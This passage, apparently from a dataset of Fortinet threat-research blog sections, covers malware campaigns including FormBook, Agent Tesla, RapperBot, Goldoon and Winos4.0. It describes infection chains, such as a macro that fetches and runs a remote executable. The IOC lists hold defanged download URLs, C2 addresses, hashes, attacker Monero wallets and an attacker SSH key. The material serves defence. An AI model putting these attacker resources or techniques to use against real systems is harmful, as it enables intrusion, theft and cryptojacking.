RTF file, the extracted 64-bit Dll file as well as the decrypted FormBook with the following AV signatures.\nMSWord/Formbook.9184!trRTF/CVE_2017_11882.FB!exploitW64/Formbook.RT!trW32/Formbook.AA!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected.\nTo stay informed of new and emerging threats, you cansign upto receive future alerts.\nWe also suggest our readers go through the freeNSE training:NSE 1 \u2013 Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs\nhxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png\nRelevant Sample SHA-256\n[order0087.docx]93CF566C0997D5DCD1129384420E4CE59764BD86FDABAAA8B74CAF5318BA9184\n[Algeria.rtf]7C66E3156BBE88EC56294CD2CA15416DD2B18432DEEDC024116EA8FBB226D23B\n[AdobeID.pdf]2E73B32D2180FD06F5142F68E741DA1CFF1C5E96387CEBD489AD78DE18840A56\n[Decrypted FormBook from PNG file]6AC778712DFFCE48B51850AC34A846DA357BE07328B00D0B629EC9B2F1C37ECE", "source": "Fortinet"}, {"title": "Introduction", "content": "In 2024, the FortiGuard Labs team observed a decisive shift in the threat landscape: Attackers are compressing the time between reconnaissance and compromise, and the window for defenders to respond is narrowing to days, sometimes hours.\nThe2025 Global Threat Landscape Reportdraws on telemetry from Fortinet's global sensor network and threat intelligence from FortiGuard Labs to deliver a clear message: the adversary advantage is accelerating. And unless organizations change how they measure and manage risk, the gap will continue to widen.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Any OS running Apache Active MQ versions prior to 5.15.16, 5.16.7, 5.17.6, and 5.18.3Impacted Parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical\nThis past October, Apache issued a criticaladvisoryaddressing CVE-2023-46604, a vulnerability involving the deserialization of untrusted data in Apache. On November 2, the Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2023-46604 to its known exploited list,KEV Catalog, indicating this vulnerability's high risk and impact. Fortiguard Labs also released anoutbreak alertand athreat signal reportabout the active exploitation of CVE-2023-46604, providing more details and recommendations for mitigation.\nTechnical details and proof-of-concept (PoC) code for CVE-2023-46604 are publicly available, making it easier for attackers to exploit this vulnerability. In recent weeks, Fortiguard Labs has detected numerous threat actors exploiting CVE-2023-46604 to disseminate diverse strains of malware. Our analysis has unveiled the emergence of a newly discovered Golang-based botnet named GoTitan and a .NET program called \"PrCtrl Rat,\" equipped with remote control capabilities. Additionally, we have identified other well-known malware and tools in play. Initially developed as an advanced penetration testing tool and red teaming framework, Sliver supports various callback protocols, including DNS, TCP, and HTTP(S), streamlining egress processes. Kinsing has solidified its position in cryptojacking operations, showcasing its ability to quickly capitalize on newly discovered vulnerabilities. Meanwhile, Ddostf, with a history dating back to 2016, continues to exhibit its proficiency in executing targeted Distributed Denial of Service (DDoS) attacks.\nThis article will detail the exploitation and provide insights into the malware associated with these recent attacks.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Despite the release of a patch for CVE-2023-46604 over a month ago, threat actors persist in exploiting this vulnerability to distribute malware on susceptible servers. This blog introduces newly discovered threats, including the Golang-based botnet GoTitan and the .NET program \"PrCtrl Rat,\" which have emerged as a consequence of this exploitation. Additionally, users should remain vigilant against ongoing exploits by Sliver, Kinsing, and Ddostf. It is crucial to prioritize system updates and patching and regularly monitor security advisories to effectively mitigate the risk of exploitation.\nFortinet Protections\nThe malware described in this report are detected and blocked byFortiGuard Antivirusas:\nXML/Agent.E2ED!trBASH/Miner.BPH!trBASH/Agent.5C93!trELF/GoTitan.AR!trLinux/Sliver.AE!trELF/Ddostf.D!trMSIL/Agent.F3D5!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\nFortinet has also released an IPS signature to proactively protect our customers from the threats contained in the report:\nCVE-2023-46604:Apache.ActiveMQ.CVE-2023-46604.Code.Execution\nThe URLs are rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\nWe also suggest that organizations use Fortinet's free NSE training module: NSE 1 \u2013 Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks.\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "IP List\n185[.]122[.]204[.]197194[.]38[.]22[.]5342[.]121[.]111[.]11291[.]92[.]242[.]14199[.]231[.]186[.]249173[.]214[.]167[.]15591[.]92[.]240[.]41\nFiles\nf75cb3e540b96cd54a966c512c854c832807e354772ae1a326b758394b01b607dbf8ba47a5973c86fef32c2d696b09e1930a8384087c62ace1aa5c4084ee1a3f1a3d9960a1685707f8cc2bc447c88f5c3278454fbf0a35a7959717ad835348cdd8f55bbbcc20e81e46b9bf78f93b73f002c76a8fcdb4dc2ae21b8609445c14f90cc60a0c480e4d898fa77ab501bbd2afaf3f5fb89a2917a31e7f5fdaa6c3879ced09f95f4b4b482207bb300ff6ec15ed8ca5fdde97af02fa9fbe01adaaf7673bbfce7938591dd9fa3e1368d7eb86fc7f11e935349437fc11de4f124bbbc16deef5a36570506bfaff60b684cd26dde3a64a3db4eaa9da78a1434cfd4b390ef3d55acf5ce55678519cd65e001d3f600fa1de288f1cd3e203b4c9439979f4b67175923f2be3d55fcdab7da5cb2be3c16dfcc1582b83d1e4a831236445a52ca81878b90abde8f449bbe6bec9495386fab1833c0654f83c7b2f5ebcf5b14743c30600", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical\nBandook malware is a remote access trojan that has been continuously developed since it was first detected in 2007. It has been used in various campaigns by different threat actors over the years. FortiGuard Labs identified a new Bandook variant being distributed via a PDF file this past October. This PDF file contains a shortened URL that downloads a password-protected .7z file. After the victim extracts the malware with the password in the PDF file, the malware injects its payload into msinfo32.exe. In this article, we will briefly introduce Bandook's behavior, provide detailed information about the modified elements of this new variant, and share some examples of the mechanism of its C2 communication.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This article unveils new details about the C2 mechanism of this long-existing malware and the new features in its latest variant. A large number of commands for C2 communication can be found in this malware. However, the tasks performed by its payload are fewer than the number in the command. This is because multiple commands are used for a single action, some commands call functions in other modules, and some are only used to respond to the server. Though the entire system is not observed in this attack, FortiGuard will continue monitoring malware variants and provide appropriate protections.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Windows UsersImpact:Collects sensitive information from a victim's computerSeverity Level:Critical\nA new phishing campaign was recently captured by our FortiGuard Labs that spreads a new Agent Tesla variant targeting Spanish-speaking people.\nSecurity researchers have detected Agent Tesla campaigns from time to time for years. Agent Tesla is a well-known .Net-based Remote Access Trojan (RAT) designed to stealthily infiltrate victim's computers and steal their sensitive information, such as their computer's hardware information, login user information, keystrokes, email contacts, web browser cookies files, system clipboard data, screenshots, and basic information like login user name, computer name, OS information, CPU and RAM information, as well as saved credentials in widely installed software.\nIn-depth research on this campaign shows that it also leverages multiple techniques to deliver the Agent Tesla core module, such as using known MS Office vulnerabilities, JavaScript code, PowerShell code, fileless modules, and more, to protect itself from being analyzed by security researchers.\nIn this analysis, I will elaborate on how the campaign works to load Agent Tesla onto a victim's computer, how it starts, what sensitive data it is able to collect, and the way it sends stolen data to the attacker.", "source": "Fortinet"}, {"title": "Summary", "content": "In this analysis, I went through the entire process of the Agent Tesla campaign targeting Spanish-speaking people. The flowchart in Figure 16 outlines this complex malicious campaign, detailing the process from the phishing email to the stolen information being submitted to an FTP server.\nWe also examined how it uses multiple techniques to escape researcher analysis, such as exploiting two Microsoft vulnerabilities carried by Excel, RTF documents, executing JavaScript and PowerShell scripts, and encoding most downloaded files in base64.\nNext, we looked at how the fileless loader-module is called to download the Agent Tesla executable and run it in a process-hollowed AddInProcess.exe process.\nI then elaborated on how Agent Tesla detects whether it's running in an analysis environment, like sandboxes, virtual machines, etc., or where there is AV software running, like Avast, Comodo, etc.\nWe then looked at the functions this variant can perform on the victim's device. It collects saved credentials from over 80 popular software applications and victim email contacts from Thunderbird profile files.\nFinally, you learned how this Agent Tesla variant submits the sensitive data it has harvested from the victim's device to an FTP server using the \"STOR\" method.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs\nhxxps[:]//ilang[.]in/QqBbmc\nhxxp[:]//equalizerrr[.]duckdns[.]org/eveningdatingforeveryone.js\nhxxp[:]//equalizerrr[.]duckdns[.]org/droidbase64controlfire.txt\nhxxps[:]//paste[.]ee/d/yWWXG\nhxxps[:]//uploaddeimagens[.]com[.]br/images/004/773/812/original/js.jpg?1713882778\nFTP Server List\nftp[.]fosna.net\nRelevant Sample SHA-256\n[transferencia_swift_87647574684.xla]\n8406A1D7A33B3549DD44F551E5A68392F85B5EF9CF8F9F3DB68BD7E02D1EABA7\n[RTF document]\n208AF8E2754A3E55A64796B29EF3A625D89A357C59C43D0FF4D2D30E20092D74\n[The loader-module]\n7230CC614270DCA79415B0CF53A666A219BEB4BEED90C85A1AC09F082AEA613B\n[Agent Tesla Executable]\nA1475A0042FE86E50531BB8B8182F9E27A3A61F204700F42FD26406C3BDEC862", "source": "Fortinet"}, {"title": "Introduction", "content": "FortiGuard Labs recently captured Excel documents in the Microsoft OLE Compound File format that contain malicious VBA Macros. Their file names are Pago_detalles.xls, makbuzu.xls, and Pago.xls. I then conducted deep research on them and found that they all belong to the same malicious campaign that cryptojacks systems to mine for Monero (XMR) cryptocurrency.\nAffected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Cryptojack Victim's Device to Mine CryptocurrencySeverity level:Critical\nIn this analysis, I will show how the crypto miner software is delivered by opening the Excel document and how it is executed on a victim's device. I also look at the techniques it uses to prevent its code from being analyzed, how it gains persistence on the victim's device, and how the malware performs process hollowing to execute the Monero miner on the victim's device.\nThe content and VBA project are similar in all three Excel documents.\nWhen the document is opened in Microsoft Excel, as shown in Figure 1.1, it pops up a yellow warning bar to alert the user that the document contains a risky Macro project, which will be executed once the \"Enable Content\" button is clicked.\nGiven that the content is written in Spanish, this campaign targets Spanish-speaking people. It shows a blurred picture of a statement that tricks the user into clicking the button on the yellow bar for a clearer view.\nThe VBA Macro project is password protected from viewing, editing, and debugging. Once I disarmed its protections, I found an auto-execution sub-procedure Workbook_Open() in the project that is executed automatically once the Excel document is opened.\nAfter deobfuscating the VBA statements, it is easy to understand the purpose of the sub-procedure Workbook_Open(), as shown in Figure 1.2.\nIt downloads a file from hxxps[:]//www[.]tractorandinas[.]com/wocontent/templates.exe, saves it into the system's Templates folder, and renames it \"GHJFRGUNL.exe\". At the end of the Workbook_Open() auto-run procedure, it calls \"FPKGNSJJDW_Shell_Application.Open (VMNXMOV_local_file)\" to run the downloaded file on the victim's device.", "source": "Fortinet"}, {"title": "Summary", "content": "In this analysis, we walked through the entire process, from executing the VBA code in the Excel document to downloading an executable file (template.exe or GHJFRGUNL.exe).\nNext, I explained how the payload .Net module is extracted from the executable file and executed. Then, you learned how the malware communicates with its C2 server and what control data (Monero miner) is received.\nLast, I elaborated on how it injects a Monero miner into another process (\"AddInProcess.exe\") by executing process hollowing to mine Monero on the attacker's behalf.\nBelow is a workflow chart that depicts the entire process.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs:\nhxxps://www[.]tractorandinas[.]com/wocontent/templates[.]exe\nhxxps://onedrive[.]live[.]com/download?cid=F32323276F5346E9&resid=F32323276F5346E9%21132&authkey=AJUNOnV3DDTyOJw\nhxxps://onedrive[.]live[.]com/download?cid=F32323276F5346E9&resid=F32323276F5346E9%21131&authkey=ANCBF29YwxfXxd4\nC2 Server List:\ndnuocc[.]com:9077\ndnuocc[.]com:9078\nRelevant Sample SHA-256\n[Pago.xls]\nEF02701E2196F54B5858BCB67A41D34FC9A5F248EFDAE181C701C200950D638D\n[makbuzu.xls]\n68346D23F359A27744B49D6EA9BD229F2929D1CEE057670D2BA73545C0BA427D\n[Pago_detalles.xls]\n417AE2D5F5111DDF80B63C443E14B70EC2052B3E64A35940C9F81F262F7E526E\n[templates.exe / GHJFRGUNL.exe]\n8A2194A75F972890729328A15A01B34E327A0145A6121098315AF9ECBF86ED67\nLearn more about Fortinet'sFortiGuard Labsthreat research and global intelligence organization and Fortinet's FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs.", "source": "Fortinet"}, {"title": "Introduction", "content": "On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants.\nThis edition of the Ransomware Roundup covers the KageNoHitobito and DoNex ransomware.\nAffected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High", "source": "Fortinet"}, {"title": "Victimology", "content": "Information on the infection vector used by the KageNoHitobito ransomware threat actor is unavailable.\nThe KageNoHitobito ransomware samples were submitted to a publicly available file scanning service from several countries: Chile, China, Cuba, Germany, Iran, Lithuania, Peru, Romania, Sweden, Taiwan, the United Kingdom, and the United States. This suggests that the KageNoHitobito ransomware threat actor may have made the malware available on file-sharing services as fake software or game cheats and lured victims to these locations.", "source": "Fortinet"}, {"title": "Victimology", "content": "The DoNex ransomware's data leak site on TOR listed five victims during our investigation. The organizations that were claimed to have been affected by the ransomware are located in Belgium, the Czech Republic, Italy, the Netherlands, and the United States.", "source": "Fortinet"}, {"title": "Data Leak Site", "content": "During our research, the DoNex ransomware was operating a data leak site on TOR, which listed five victims in Europe and North America.\nSince no new victims have been added since February 27th, the threat actor has likely already ceased operations and moved on.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:WindowsImpacted parties:Windows UsersImpact:Potential to deploy additional malware for additional purposesSeverity level:Medium\nIn early February of 2022,Microsoft announcedthat Internet Macros would be blocked by default to improve the security of Microsoft Office.According to their blogpublished in late Feb 2023, this change began rolling out in some update channels in April 2022. Other channels followed in July and October 2022, with the final rollout in January 2023.\nOffice uses a specific algorithm to determine whether to run macros in files from the Internet. The process starts by checking the file attribute. If it has a Mark of the Web (MOTW) attribute, it verifies whether it is from a trusted location and performs other processes, and based on those outcomes, it decides whether to block or run the macro.\nSince that announcement, we have observed that cyber threat actors have begun to test and adopt new infection vectors to replace Office macros. Several methods include using .hta, .lnk, and .chm files, targeting Office vulnerabilities (Equation Editor and Follina are the most common), and we have seen the use of xll files over the past year by cyber threat actors to distribute their malicious payloads.\nThe most common method employed by several cybercrime and nation-state actors is using ISO image files that usually contain a .lnk file and a dll payload to distribute their malware. In this method, the victim must execute the .lnk file, which leads to executing the dll file \u2013 commonly either a malicious payload or a downloader that grabs the next-stage payload. These ISO images are either directly attached to a spam/phishing email or have been dropped using other methods, like html smuggling, in which an html file is attached to the spam/phishing email, and by opening it, a malicious ISO file is dropped in the victim's machine. We covered these techniques in blogs last year,hereandhere.\nEven though several cyber threat actors have adopted TTPs to not use Office macros, we have observed several threat actors still relying on Office macros to initiate their attacks. In this blog post, we provide an overview of some of the interesting Office macro-embedded documents we observed early this year (some of these activities have already been reported on by security researchers on Twitter). It is worth mentioning that while some of the threat actors had multiple activities, we only cover one of them as an example in the post. But we added all the related IOCs in the IOC (Indicator of Compromise) section at the end of this blog.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This blog post provided an overview of threat actors still using macro-based Office documents. We showed several APT groups, such as Kimsuky, Donot, and SideCopy, and cyber-crime actors, such as Emotet, still relying on macro-based Office documents to initiate attacks and distribute their payloads. This research shows that although it has been over a year since Microsoft announced its intent to disable Internet macros, numerous threat actors still use those macros to distribute their malware. This suggests that security companies/people still need to be cautious about opening Office documents and update their software to the latest versions that block these macros by default.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlierImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High\nIn April, FortiGuard Labs observed a new botnet targeting a D-Link vulnerability from nearly a decade ago, CVE-2015-2051. This vulnerability allows remote attackers to execute arbitrary commands via a GetDeviceSettings action on the HNAP interface. As a result, an attacker can create a crafted HTTP request with a malicious command embedded in the header.\nOur IPS signature captured attempts to exploit the CVE-2015-2051 vulnerability to propagate a new botnet that we have named \"Goldoon.\" Figure 1 shows the attack packet. If a targeted device is compromised, attackers can gain complete control, enabling them to extract system information, establish communication with a C2 server, and then use these devices to launch further attacks, such as distributed denial-of-service (DDoS). Our telemetry data also indicates that this botnet activity spiked in April, almost doubling the usual frequency.\nIn this article, we will provide detailed insights into the propagation and actions of the Goldoon botnet.", "source": "Fortinet"}, {"title": "Conclusion", "content": "While CVE-2015-2051 is not a new vulnerability and presents a low attack complexity, it has a critical security impact that can lead to remote code execution. Once attackers successfully exploit this vulnerability, they can incorporate compromised devices into their botnet to launch further attacks. FortiGuard Labs has identified one such new botnet, \"Goldoon,\" that is exploiting this vulnerability, reminding us that botnets continue to evolve and exploit as many devices as possible. We strongly recommend applying patches and updates whenever possible because of the ongoing development and introduction of new botnets.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nIn August 2024, FortiGuard Labs observed a python infostealer we call Emansrepo that is distributed via emails that include fake purchase orders and invoices. Emansrepo compresses data from the victim's browsers and files in specific paths into a zip file and sends it to the attacker's email. According to our research, this campaign has been ongoing since November 2023.\nThe attacker sent a phishing mail containing an HTML file, which was redirected to the download link for Emansrepo. This variant is packaged by PyInstaller so it can run on a computer without Python.\nAs time goes by, the attack flow has become increasingly complex. Below are the attack flows we found in July and August 2024:\nVarious stages are being added to the attack flow before downloading Emansrepo, and multiple mailboxes are used to receive different kinds of stolen data. This article will provide a detailed analysis of each attack chain and its behavior. We will then provide a quick summary of the next campaign.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Emansrepo has been active since at least last November, and the attack method is continuously evolving. The attack vectors and malware are ever-changing and pervasive, so it's vital for organizations to maintain cybersecurity awareness. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required.", "source": "Fortinet"}, {"title": "Introduction", "content": "While analyzing malware samples collected from several victims, the FortiGuard team identified a grouping of malware droppers used to deliver various final-stage payloads throughout 2023. Malware droppers are malicious software designed to deliver and execute additional malware on a victim system and are employed to obfuscate final payloads during load and initial execution.\nDroppers within this group employ multiple stages of obfuscated payloads loading reflectively in memory. Some of the final stage payloads we identified include Leonem, AgentTesla, SnakeLogger, RemLoader, Sabsik, LokiBot, Taskun, Androm, Upatre, and Remcos. We have named this group of payloads 'TicTacToe dropper' due to a common Polish language string, 'Kolko_i_krzyzyk,' found in multiple earlier samples of the dropper, which translates to TicTacToe in English. While not all versions of this group of droppers contain this string, commonalities in their behavior led us to this grouping.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This dropper delivers multiple types of final payloads. As a result, we do not believe a single threat actor group uses this dropper. Instead, it is used as a tool that may be sold as a service to threat actors. We discovered that samples distributed at the beginning of 2023 contained the strings TicTacToe (Kolko_i_krzyzyk). Later campaigns had different unique strings common across the same campaigns but distributed different final-stage payloads. Some of the strings include: 'MatrixEqualityTestDetail,' 'QuanLyCafe,' 'Pizza_Project,' 'Kakurasu,' 'BanHang_1', 'ChiuMartSAIS,' etc. This indicates that the dropper tool is in constant development, and developers are trying to evade the string-based analysis of their malware dropper. By understanding the operation of this dropper and implementing solutions that can prevent its execution, organizations will be able to prevent the execution of a variety of final-stage payloads before they can be loaded.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nMany game makers allow users to alter a game's appearance or behavior to increase its enjoyment and replay value. Players can often also download packages created by others. However, this is also a chance for attackers to distribute their malware. This article examines a batch stealer distributed via a crafted Minecraft source pack.\nThe zEus stealer malware has been added to a source pack that was being shared on YouTube. The name-zEus-is from a previous variant of this malware. The variant (d9d394cc2a743c0147f7c536cbb11d6ea070f2618a12e7cc0b15816307808b8a) is also distributed via a Minecraft source pack, but it's embedded in a WinRAR self-extract file. The self-extract file mimics a Windows screensaver file. It runs the stealer and opens the image used as a file icon. It's an image from the Internet with the string \"zEus\" added. This name is also found in a profile of the Discord webhook receiving stolen data.", "source": "Fortinet"}, {"title": "Conclusion", "content": "zEus stealer has a relatively simple attack flow, but it collects a wide variety of information that provides data for the next attack and contributes to social engineering. This is a reminder about the dangers of downloading and using files from an unknown source. Even a source pack, usually loaded by the software, can be a carrier for malware.\nIn addition to only downloading files from reputable sources and checking reviews of a file and author, FortiGuard Labs recommends enabling MFA as an additional protection layer. MFA prevents unauthorized account access if a password has been compromised and can also alert users to unusual account activities. We also recommend subscribing to a service like FortiRecon that automatically scans the web for leaked data.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical\nFortiGuard Labs has encountered new samples of the RapperBot campaign active since January 2023. RapperBot is a malware family primarily targeting IoT devices. It has been observed in the wild since June 2022. FortiGuard Labs reported on its previous campaigns inAugust 2022andDecember 2022. Those campaigns focused on brute-forcing devices with weak or default SSH or Telnet credentials to expand the botnet's footprint for launchingDistributed Denial of Service(DDoS) attacks.\nIn this campaign, these threat actors have started venturing intocryptojacking, specifically for Intel x64 machines. Initially, they deployed and executed a separate Monero cryptominer alongside the usual RapperBot binary. But in late January 2023, they combined both functionalities into a single bot.\nThis article will discuss the changes observed in this new campaign and provide a technical analysis of the RapperBot variant upgraded with miner capabilities.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Financially motivated botnet operators are always on the lookout to extract the maximum value from machines infected by their botnets. The threat actors behind the RapperBot botnet are no exception, as evident in their addition of cryptojacking capabilities to target x64 machines.\nRapperBot continues to be a dangerous threat due to its continual updates to evade detection, as highlighted above. As its primary infection vector of compromising SSH services using weak or default passwords remains the same, mitigating it by enabling public key authentication or setting strong passwords for all devices connected to the internet is still effective in mitigating this threat.\nFortiGuard Labs will continue to monitor and report on RapperBot's development.", "source": "Fortinet"}, {"title": "ioc", "content": "Files\nRapperBot\n7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f\n912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65\nf06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa\n6c034ff9b5447da62822e3231e5e2d5db225756b3e216f6fc469469cb1d81813\ndfaffe78b8ccb03626c2f55596f977da917e8e9a00ee7576ce9eca688d88447d\n95aa6882f5ea5a892ef832ef15dea77261394a7fec6db9d91267d40f1cf2bfa5\nXMRig miner\n0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404\nBash scripts\nbd87ac780e574ae8415907f88a3b48af578bb269308b56826e2f33438559e4b7\n3296598c79748322dfff8eb786705d048725c04b23dd3a293f52a1acafe9e7ae\n7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f\nDownload URLs\nhxxp://109[.]206[.]243[.]207/d\nhxxp://109[.]206[.]243[.]207/ssh/arm4\nhxxp://109[.]206[.]243[.]207/ssh/arm5\nhxxp://109[.]206[.]243[.]207/ssh/arm6\nhxxp://109[.]206[.]243[.]207/ssh/arm7\nhxxp://109[.]206[.]243[.]207/ssh/bot\nhxxp://109[.]206[.]243[.]207/ssh/scan_arm4\nhxxp://109[.]206[.]243[.]207/ssh/scan_arm5\nhxxp://109[.]206[.]243[.]207/ssh/scan_arm6\nhxxp://109[.]206[.]243[.]207/ssh/scan_arm7\nhxxp://109[.]206[.]243[.]207/ssh/x86_64\nhxxp://109[.]206[.]243[.]207/ssh/xmrig\nhxxp://171[.]22[.]136[.]15/arm4\nhxxp://171[.]22[.]136[.]15/arm5\nhxxp://171[.]22[.]136[.]15/arm6\nhxxp://171[.]22[.]136[.]15/arm7\nC2s\n109[.]206[.]243[.]207\n171[.]22[.]136[.]15\nMining Pools\n109[.]206[.]243[.]207:31271\n109[.]206[.]243[.]207:25621\npool[.]hashvault[.]pro:80\nMonero Wallets\n43Zs6jyniktVUNfiN8NY16TrvFKWbx3qogoRvstuquZdVA8EXvhqhz1W4hUzpjQXHAf3pDQ8UXxegFh8G26uCycKPz41ceW\n47RupsxSjeHb4sHMwJ681vbjpFHAwXg6kMn1znbioqy96Qj9j2VuHrD2mXsEReELEdjRsDVKBK3Ru3diW3AgZ41Z7mzDwb4\nSSH Key\nAAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdNzBcU05QhhWW6tSuYcXcyAz8Cp73JmN6TcPuVqHeFYDg05KweYqTqThFFHbdxdqqrWy6fNt8q/cgI30NBa5W2LyZ4b1v6324IEJuxImARIxTc96Igaf30LUza8kbZyc3bewY6IsFUN1PjQJcJi0ubVLyWyyJ554Tv8BBfPdY4jqCr4PzaJ2Rc1JFJYUSVVT4yX2p7L6iRpW212eZmqLMSoR5a2a/tO2s1giIlb+0EHtFWc2QH7yz/ZBjnun7opIoslLVvYJ9cxMoLeLr5Ig+zny+IEA3x090xtcL62X0jea6btVnYo7UN2BARziisZze6oVuOTCBijuyvOM6ROZ6s/wl4CQAOSLDeFIP5L1paP9V1XLaYLDBAodNaUPFfTxggH3tZrnnU8Dge5/1JNa08F3WNUPM1S1x8L2HMatwc82x35jXyBSp3AMbdxMPhvyYI8v2J1PqJH8OqGTVjdWe40mD2osRgLo1EOfP/SFBTD5VEo95K2ZLQ== system key generated by server 20220709", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nIn September 2024, FortiGuard Labs observed an attack using the notorious SmokeLoader malware to target companies in Taiwan, including those in manufacturing, healthcare, information technology, and other sectors. SmokeLoader is well-known for its versatility and advanced evasion techniques, and its modular design allows it to perform a wide range of attacks. While SmokeLoader primarily serves as a downloader to deliver other malware, in this case, it carries out the attack itself by downloading plugins from its C2 server.", "source": "Fortinet"}, {"title": "Conclusion", "content": "SmokeLoader is a modular malware that is adaptable to different needs. In this case, SmokeLoader performs its attack with its plugins instead of downloading a completed file for the final stage. This shows the flexibility of SmokeLoader and emphasizes that analysts need to be careful even when looking at well-known malware like this. FortiGuard will continue monitoring these attack campaigns and provide appropriate protections as required.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:Medium\nWinos4.0 is an advanced malicious framework that offers comprehensive functionality, a stable architecture, and efficient control over numerous online endpoints to execute further actions. Rebuilt from Gh0strat, it includes several modular components, each handling distinct functions. Winos4.0 has been deployed in various attack campaigns, such as Silver Fox.\nFortiGuard Labs has identified multiple samples of this malware hidden within gaming-related applications, including installation tools, speed boosters, and optimization utilities. Analysis of the decoded DLL file reveals a potential targeting of the education sector, as indicated by its file description, \"\u6821\u56ed\u653f\u52a1\" (Campus Administration). In this blog post, we will delve into a comprehensive technical analysis of a campaign that leveraged these applications to deliver Winos4.0.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Winos4.0 is a powerful framework, similar to Cobalt Strike and Sliver, that can support multiple functions and easily control compromised systems. Threat campaigns leverage Game-related applications to lure a victim to download and execute the malware without caution and successfully deploy deep control of the system. The entire attack chain involves multiple encrypted data and lots of C2 communication to complete the injection. Users should be aware of any new application's source and only download the software from qualified sources.\nFortinet Protections\nThe malware described in this report is detected and blocked byFortiGuard Antivirusas:\nW32/Agent.HUJ!tr.dldrW32/Agent.NJD!trData/Agent.3A23!trW32/Agent.501F!trMSIL/Agent.93AB!trW32/Agent.DCO!trW32/Agent.SS!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected.\nTheFortiGuard Web Filtering Serviceblocks the C2 servers and downloads URLs.\nWe also suggest that organizations go through Fortinet's free training module:Fortinet Certified Fundamentals (FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks.\nFortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": 